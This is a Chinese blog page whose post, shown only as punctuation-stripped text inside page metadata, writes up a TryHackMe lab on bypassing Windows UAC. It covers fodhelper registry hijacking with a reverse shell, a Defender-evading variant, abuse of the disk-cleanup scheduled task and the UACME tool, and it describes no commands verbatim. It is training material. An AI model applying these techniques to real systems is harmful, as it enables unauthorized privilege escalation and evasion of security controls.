<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>THM-ByPass_UAC | hybcx</title><meta name="keywords" content="TryHackMe"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="THM-ByPass_UAC"><meta name="application-name" content="THM-ByPass_UAC"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="THM-ByPass_UAC"><meta property="og:url" content="http://hybcx.xyz/2024/08/08/thm-bypass-uac/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="了解在 Windows 主机中绕过用户帐户控制 (UAC) 的常见方法。 0x01 简介 在这个房间中，我们将研究绕过 Windows 系统可用的安全功能（称为**用户帐户控制 (&amp;amp;nbsp;UAC&amp;amp;nbsp;)）的常见方法。此功能允许任何进程以低权限运行，而与运行它的人（普通用户或管理员）无关。"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="了解在 Windows 主机中绕过用户帐户控制 (UAC) 的常见方法。 0x01 简介 在这个房间中，我们将研究绕过 Windows 系统可用的安全功能（称为**用户帐户控制 (&amp;amp;nbsp;UAC&amp;amp;nbsp;)）的常见方法。此功能允许任何进程以低权限运行，而与运行它的人（普通用户或管理员）无关。"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/08/08/thm-bypass-uac/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'THM-ByPass_UAC',
  postAI: '',
  pageFillDescription: '0x01 简介, 房间目标, 房间先决条件, 0x02 UAC, 什么是UAC, UAC 提权, 完整性级别, 过滤后的令牌, 用常规的方式打开应用程序, UAC 设置, UAC 内部机制, ByPass UAC, 0x03 基于GUI的绕过, 案例研究：msconfig, 案例研究：azman.msc, 0x04 UAC 自动提升进程, 自动提升, 案例研究：Fodhelper, 把它们放在一起, 清理痕迹, 0x05 UAC 改进Fodhelper漏洞绕过WinDefender, Windows Defender, 改进 fodhelper 漏洞利用, 清理痕迹, 0x06 UAC 环境变量拓展, 绕过 Always Notify, 案例研究：磁盘清理计划任务, 把它们放在一起, 清理痕迹, 0x07 自动利用, 自动绕过UAC, 0x08 结论了解在主机中绕过用户帐户控制的常见方法简介在这个房间中我们将研究绕过系统可用的安全功能称为用户帐户控制的常见方法此功能允许任何进程以低权限运行而与运行它的人普通用户或管理员无关从攻击者的角度来看绕过对于突破高度限制的环境并完全提升目标主机的权限至关重要在学习绕过技术的同时我们还将研究蓝队可以检测到的任何可能触发的警报以及可能在目标系统上创建的工件房间目标了解攻击者可用于绕过的不同技术房间先决条件建议在此之前先浏览一下房间什么是用户帐户控制是一项安全功能默认情况下强制任何新进程在非特权帐户的安全上下文中运行此策略适用于任何用户包括管理员本身启动的进程我们的想法是我们不能仅仅依靠用户的身份来确定某些操作是否应该被授权尽管这似乎有悖常理但想象一下用户不知不觉地从下载恶意应用程序的情况如果是管理员组的一部分则他启动的任何应用程序都将继承其访问令牌权限因此如果决定启动恶意应用程序并且禁用恶意应用程序将立即获得管理员权限相反当启用时恶意应用程序将被限制为非管理访问令牌提权如果管理员需要执行特权任务提供了一种提升权限的方法提升的工作原理是向用户显示一个简单的对话框以确认他们明确批准在管理安全上下文中运行应用程序完整性级别是一种强制完整性控制机制它通过为每个用户进程和资源分配一个完整性级别来区分它们一般来说具有较高访问令牌的用户或进程可以访问具有相同或更低的资源的优先级高于常规的访问控制列表因此即使根据您被授权访问某个资源但如果您的不够高也无法访问该资源使用以下个按从低到高的顺序排列完整性级别使用一般用于与即交互权限非常有限分配给标准用户和管理员的过滤令牌在启用了的情况下管理员使用提升的令牌如果被禁用所有管理员将始终使用高完整性级别令牌保留供系统使用当进程需要访问资源时它将继承调用用户的访问令牌及其关联的如果一个进程分叉一个子进程也会发生同样的情况过滤后的令牌为了实现这种角色分离在登录期间以稍微不同的方式对待普通用户和管理员非管理员在登录时将收到一个访问令牌该令牌将用于用户执行的所有任务该令牌具有中等管理员将收到两个访问令牌过滤的令牌剥离了管理员权限的令牌用于常规操作该代币具有中等提升的令牌具有完全管理员权限的令牌在需要使用管理权限运行某些内容时使用该令牌具有高通过这种方式管理员将使用他们的过滤令牌除非他们通过明确请求管理权限用常规的方式打开应用程序当尝试打开常规控制台时我们可以以非特权用户或管理员身份打开它根据我们的选择中或高完整性级别令牌将被分配给生成的进程如果我们使用分析这两个进程我们可以看到关联的标记及其差异左侧是一个具有中等完整性级别的过滤令牌并且几乎没有分配任何权限右侧的进程运行在高完整性级别下并且具有更多可用的权限另一个可能不太明显的区别是中等完整性级别的进程实际上被拒绝了任何与属于管理员组相关的权限设置根据我们的安全要求可以配置为在四种不同的通知级别运行始终通知在更改设置或程序尝试安装应用程序或对计算机进行更改时通知并提示用户授权仅当程序尝试对我的计算机进行更改时通知我当程序尝试安装应用程序或对计算机进行更改时通知并提示用户进行授权更改设置时不会提示管理员仅当程序尝试对我的计算机进行更改时通知我不要使我的桌面变暗与上面相同但不会在安全桌面上运行提示符从不通知禁用提示管理员将使用高权限令牌来运行一切默认情况下配置为仅当程序尝试对我的计算机进行更改时通知我级别从攻击者的角度来看前三个较低的安全级别是等效的只有始终通知设置会有所不同内部机制的核心是应用程序信息服务或每当用户需要提升权限时就会发生以下情况用户请求以管理员身份运行应用程序使用动词进行调用该请求被转发到来处理提升检查应用程序清单以查看是否允许自动提升稍后将详细介绍执行这会在安全桌面上显示提示符安全桌面只是一个单独的桌面它将进程与实际用户桌面中运行的任何进程隔离开来以避免其他进程以任何方式篡改提示符如果用户同意以管理员身份运行应用程序服务将使用用户的提升令牌执行请求然后将设置新进程的父进程以指向请求提升的从攻击者的角度来看在某些情况下您可能会通过或获得主机的远程您甚至可以通过属于管理员组的帐户获得访问权限但是当您尝试创建后门用户以供将来访问时您会收到以下错误通过检查分配的组我们可以确认我们的会话正在以中等运行这意味着我们正在有效地使用过滤后的令牌即使我们与管理用户建立会话也会阻止我们执行任何管理任务因为我们当前仅使用过滤后的令牌如果我们想完全控制我们的目标我们必须绕过有趣的是微软并不认为是安全边界而是认为它只是对管理员的一种便利以避免不必要地以管理员权限运行进程从这个意义上说提示更多的是提醒用户他们正在使用高权限运行而不是阻止恶意软件或攻击者的操作由于它不是安全边界任何绕过技术都不被微软视为漏洞因此其中一些绕过方法至今仍未修补一般来说大多数绕过技术依赖于我们能够利用高流程来代表我们执行某些操作由于高父进程创建的任何进程都将继承相同的完整性级别因此这足以获得提升的令牌而无需我们执行提示符对于本房间中呈现的所有场景我们假设我们可以使用管理帐户访问服务器但只能从控制台访问服务器我们的目标始终是无需通过即可访问高控制台基于的绕过我们将从基于的旁路开始因为它们提供了一种简单的方法来理解所涉及的基本概念这些示例通常不适用于现实场景因为它们依赖于我们能够访问图形会话从中我们可以使用标准进行提升单击启动计算机按钮部署并通过或在浏览器的并排视图中连接到它这台机器将用于房间内的所有任务案例研究我们的目标是无需通过即可访问命令提示符首先让我们从开始菜单或运行对话框打开如果我们使用在桌面上可用分析进程我们会注意到一些有趣的事情即使没有向我们显示提示也会作为高进程运行这要归功于一种称为自动提升的功能该功能允许特定的二进制文件在不需要用户交互的情况下提升稍后将详细介绍这一点如果我们可以强制为我们生成一个则该将继承使用的相同访问令牌因此作为高进程运行通过导航到工具选项卡我们可以找到一个选项来执行此操作如果我们单击我们将获得高命令提示符而无需以任何方式与交互要检索标志请使用获取的高完整性控制台执行案例研究与一样将自动提升无需用户交互如果我们能找到一种方法从该进程中生成我们将绕过请注意与不同没有预期的内置方法来生成我们可以通过一点创造力轻松克服这个问题首先让我们运行我们可以确认使用生成了一个高的进程请注意所有文件都是从管理控制台运行的要运行我们将滥用应用程序的帮助在帮助屏幕上我们将右键单击帮助文章的任何部分然后选择查看源代码这将生成一个记事本进程我们可以利用它来获取为此请转到并确保在右下角的组合框中选择所有文件转到并搜索并右键单击选择打开这将再次绕过并让我们访问高完整性命令提示符您可以检查中的进程树了解高完整性令牌如何从管理控制台通过启动一直传递到要检索标志请使用获取的高完整性控制台执行自动提升进程自动提升如前所述某些可执行文件可以自动提升无需任何用户干预即可实现高这适用于控制面板的大部分功能和提供的一些可执行文件对于应用程序需要满足一些要求才能自动提升可执行文件必须由发布者签名可执行文件必须包含在受信任的目录中例如或根据申请类型可能适用其他要求可执行文件必须在其清单中声明元素要检查文件的清单我们可以使用这是套件中提供的一个工具您可以在计算机上的中找到的副本如果我们检查的清单我们将找到属性将根据用户请求的管理单元自动提升附带的大多数文件都会自动提升会保留一个附加的可执行文件列表即使清单中未请求也会自动提升例如此列表包括和对象还可以通过配置一些注册表项来请求自动提升案例研究是默认可执行文件之一负责管理可选功能包括其他语言默认情况下未安装的应用程序或其他操作系统特征与大多数用于系统配置的程序一样可以在使用默认设置时自动提升这样管理员在执行标准管理任务时就不会收到提升的提示虽然我们已经研究了可执行文件但与不同可以在无法访问的情况下被滥用从攻击者的角度来看这意味着它可以通过中等完整性远程来使用并利用到功能齐全的高完整性进程中这种特殊技术是由发现的并已被恶意软件广泛使用值得注意的是会在注册表中搜索感兴趣的特定密钥当打开文件时它会检查注册表以了解要使用哪个应用程序注册表为每种文件类型保存一个称为程序的键其中与相应的应用程序相关联假设您尝试打开一个文件将检查注册表中称为的一部分以便系统知道它必须使用您首选的客户端来打开它要使用的命令将在每个文件的的子键下指定以为例实际上只是注册表上两个不同路径的合并视图小路描述系统范围的文件关联活动用户的文件关联检查时如果处存在特定于用户的关联则它将优先如果未配置用户特定的关联则将使用中的系统范围关联这样每个用户都可以根据需要单独选择他们喜欢的应用程序回到我们现在看到它正在尝试打开下的文件通过在下的当前用户上下文中为该创建关联我们将覆盖默认的系统范围关联从而控制使用哪个命令来打开文件由于是一个可执行文件因此它生成的任何子进程都将继承一个高完整性令牌从而有效地绕过回到我们现在看到它正在尝试打开下的文件通过在下的当前用户上下文中为该创建关联我们将覆盖默认的系统范围关联从而控制使用哪个命令来打开文件由于是一个可执行文件因此它生成的任何子进程都将继承一个高完整性令牌从而有效地绕过把它们放在一起我们的一名特工已在目标服务器上植入后门以方便您使用他设法在管理员组中创建了一个帐户但阻止了任何特权任务的执行要检索该标志他需要您绕过并获得功能齐全的高要连接后门可以使用以下命令连接后我们检查我们的用户是否属于管理员组并且它正在使用中等完整性令牌运行我们设置所需的注册表值以将类关联到反向为了您的方便可以在中找到的副本您可以使用以下命令从标准命令行设置所需的注册表项上面就是设置了临时环境变量这条命令使用向注册表添加或修改键值是之前设置的环境变量指向注册表的特定路径指定要添加或修改的值名为设置该值的数据为空字符串表示强制执行即使值已存在也会覆盖这条命令向同一个注册表键添加或修改默认值即没有指定值名通常显示为设置默认值的数据为之前设置的环境变量的值即执行的命令同样使用参数强制执行这些命令的组合效果是在注册表中创建或修改了一个键当触发这个键时例如通过设置应用的某个操作将会执行一个脚本该脚本使用工具在指定的地址和端口上建立连接并执行允许远程执行命令请注意我们如何需要创建一个名为的空值才能使类关联生效如果此注册表值不存在操作系统将忽略该命令并使用系统范围的类关联我们在我们的机器中使用设置监听器然后继续执行这又会触发我们的反向的执行接收到的以高完整性运行表明我们已成功绕过要检索标志请使用新执行注意请记住仅当您通过成功绕过且仅从生成的高完整性中才会返回该标志清理痕迹执行此漏洞的结果是在目标系统上以注册表项的形式创建了一些工件为了避免检测到我们需要使用以下命令进行清理注意请务必执行给定的命令以避免任何人为因素干扰以下任务改进漏洞绕过为简单起见我们的目标计算机已禁用但如果启用它会发生什么呢首先使用连接转到桌面并双击以下图标以启用现在尝试通过后门连接再次利用并查看服务器的上会发生什么正如您更改中的值要插入反向命令将弹出通知通过单击通知我们可以检查警报的详细信息其中提到通过修改注册表值尝试绕过如果你在注册表中查询相应的值你会发现它已经被删除了虽然到目前为止我们的漏洞似乎无法在启用的情况下工作但请检查一下如果您运行相同的命令但稍加修改会发生什么请务必在需要时替换您的地址在将有问题的注册表值设置为我们的反向所需的命令后我们立即添加了对有问题的注册表值的快速查询令人惊讶的是查询完整地输出了我们的命令我们仍然会收到的警报一秒钟后有问题的注册表值会按预期被删除似乎需要一段时间才能对我们的漏洞采取行动因此让我们在攻击者的计算机上设置一个反向侦听器并将漏洞修改为设置注册表值后立即运行如果命令运行得足够快它就会正常工作请务必在需要时替换您的地址如上图虽然还是被检测了但是我们仍然得到了根据您的运气可能会在启动之前执行给您一个反向如果由于某种原因它不适合您请记住此方法不可靠因为它取决于和首先执行的有效负载之间的竞争如果反向不起作用请继续讨论房间的其余部分因为下面将给出绕过的更一致的方法不过仍然会发出有关绕过的警报我们当前漏洞利用的问题在于它几乎没有提供变化的空间因为我们需要编写特定的注册表项才能触发它从而使很容易检测到但对此仍有一些事情要做改进漏洞利用提出了漏洞利用的变体其中使用不同的注册表项但基本原理是相同的我们不会将有效载荷写入而是使用注册表项下的条目当您在同一系统上运行具有不同版本的多个应用程序实例时使用此条目允许您指向在打开给定文件类型时要使用的应用程序的默认版本为此我们将在注册表中为我们选择的新创建一个条目任何名称都可以然后将中的条目指向我们新创建的这样当尝试使用打开文件时它会注意到指向我们新的条目并检查它以查看要使用的命令提出的漏洞代码使用来实现此目的以下是它的修改版本适合使用我们的反向请务必在需要时替换您的地址此漏洞利用名称创建一个新的并将我们的有效负载与打开此类文件时使用的命令相关联然后它将的条目指向我们的当尝试打开程序时它将被指向并使用其关联的命令这种技术更有可能逃避因为我们可以更自由地将有效负载放在何处因为保存有效负载的的名称完全是任意的让我们在攻击者的机器上启动一个新的反向并按原样从我们的后门连接执行漏洞利用因此将抛出另一个引用我们操作的警报尽管我们仍然会被检测到但必须注意的是有时反病毒软件使用的检测方法是严格针对已发布的漏洞实施的而不考虑可能的变化如果我们将的漏洞利用转换为使用则不会发出任何警报请务必在需要时替换您的地址我们得到了一个高完整性的反向要检索标志请使用新执行注意请记住仅当您通过成功绕过且仅通过从生成的高完整性中才会返回该标志清理痕迹执行此漏洞的结果是在目标系统上创建了一些工件例如注册表项为了避免检测我们需要使用以下命令进行清理注意请务必执行给定的命令以避免任何人为因素干扰以下任务环境变量拓展绕过如上一个任务所示在默认配置上您可以滥用与系统配置相关的应用程序来绕过因为大多数这些应用程序都在其清单中设置了标志但是如果配置为始终通知级别和类似的应用程序将没有任何用处因为它们将要求用户通过提示来提升这将阻止使用几种已知的旁路方法但并非所有希望都破灭了对于以下技术我们将滥用可由任何用户运行但将以调用者可用的最高权限执行的计划任务计划任务是一个令人兴奋的目标根据设计它们旨在在没有任何用户交互的情况下运行独立于安全级别因此要求用户手动提升进程不是一个选择任何需要提升的计划任务都将自动获得提升而无需经过提示案例研究磁盘清理计划任务注意请务必为此任务禁用否则运行漏洞时可能会遇到一些困难只需运行计算机桌面上提供的快捷方式即可将其禁用要了解我们选择磁盘清理的原因让我们打开任务计划程序并检查任务的配置在这里我们可以看到该任务被配置为使用用户帐户运行这意味着它将继承调用用户的权限以最高权限运行选项将使用调用用户可用的最高权限安全令牌这对于管理员来说是一个高令牌请注意如果常规非管理员用户调用此任务它将仅使用中等执行因为这是非管理员可用的最高权限令牌因此绕过将不起作用检查和选项卡我们有以下内容该任务可以按需运行在调用时执行以下命令由于该命令取决于环境变量因此我们可以通过它们注入命令并通过手动启动任务来执行它们幸运的是我们可以通过在中创建一个条目来通过注册表覆盖变量如果我们想使用执行反向我们可以按如下方式设置不带引号在命令末尾我们连接以空格结尾来注释在扩展环境变量以获得使用的最终命令时放在后面的任何内容生成的命令将是请务必在需要时替换您的地址之后的任何内容都将作为注释被忽略把它们放在一起让我们用设置一个反向的监听器然后我们将连接到端口上提供的后门最后运行以下命令将我们的有效负载写入然后执行任务请务必在需要时替换您的地址是系统中的一个命令行工具用于安排和管理任务这些任务可以是一次性的也可以是重复执行的命令允许用户创建删除查询更改运行或结束计划任务下面是对命令的详细解释这是命令的名称调用任务计划程序这是命令的一个选项用于立即运行指定的任务这是命令的一个选项后面跟着的是任务的名称代表即任务名称这是任务的完整路径和名称在这个例子中任务名称是它属于任务组这个任务通常用于执行磁盘清理操作如删除临时文件清空回收站等而特别指的是在没有用户交互的情况下自动执行这是命令的一个选项代表即交互式运行任务使用这个选项时任务会以交互模式运行即使它原本被设置为非交互模式对于某些任务这可能意味着会弹出窗口或对话框但对于任务来说即使使用了选项它应该仍然在没有用户交互的情况下运行因为它的名字暗示了静默执行综上所述这个命令的作用是立即以静默模式运行磁盘清理任务无需用户交互自动执行清理操作这可以用于脚本或自动化任务以保持系统清洁和释放磁盘空间因此您应该获得具有高的要检索标志请使用新执行注意请记住仅当您通过成功绕过时才会返回该标志并且仅通过从生成的高完整性中返回该标志清理痕迹执行此漏洞的结果是在目标系统上创建了一些工件例如注册表项为了避免检测到我们需要使用以下命令进行清理注意请务必执行给定的命令以避免任何人为因素干扰以下任务由于许多组件依赖于环境变量因此在删除用于此绕过的注册表项之前很多功能都无法正常工作自动利用自动绕过有一个出色的工具可用于测试绕过而无需从头开始编写漏洞利用程序由创建提供了可以开箱即用的绕过技术的最新存储库该工具可从其官方存储库下载虽然提供了多种工具但我们将主要关注名为的工具它运行实际的旁路您可以在下找到的编译版本使用该工具非常简单只需要您指明与要测试的方法相对应的编号项目的描述中提供了完整的方法列表如果你想测试方法你可以从命令提示符执行以下操作然后会弹出一个高完整性通过本房间介绍的方法也可以通过使用以下方法进行测试方法编号旁路技术磁盘清理计划任务使用注册表项的结论我们在这个房间中展示了几种在系统中绕过的方法虽然大多数这些方法都具有关联的自动工具但如果直接开箱即用它们将很容易被市场上的任何解决方案检测到了解实际的方法将使您作为攻击者获得优势因为您可以根据需要自定义攻击并使其更加难以规避正如我们所看到的不被视为安全边界因此容易出现多种绕过方法如果您有兴趣学习更多技术可以使用以下资源存储库使用模拟文件夹和劫持绕过绕过技术检测策略已失效阅读有关的方法',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-08-12 15:54:09',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use 